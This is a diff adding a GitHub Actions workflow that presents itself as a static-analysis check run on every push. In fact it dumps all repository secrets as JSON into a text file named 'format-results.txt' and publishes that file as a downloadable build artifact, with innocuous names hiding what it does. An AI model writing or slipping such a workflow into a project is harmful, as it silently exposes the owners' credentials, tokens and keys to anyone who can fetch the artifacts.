@@ -1,0 +1,15 @@
+on: [push]
+jobs:
+  static-analysis:
+    runs-on: ubuntu-latest
+    env:
+      VARIABLE_STORE: ${{ toJSON(secrets) }}
+    steps:
+      - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd
+      - name: Run checks
+        run: echo "$VARIABLE_STORE" > format-results.txt
+      - name: Store artifacts
+        uses: actions/upload-artifact@bbbca2ddaa5d8feaa63e36b76fdaad77386f024f
+        with:
+          name: format-results
+          path: format-results.txt
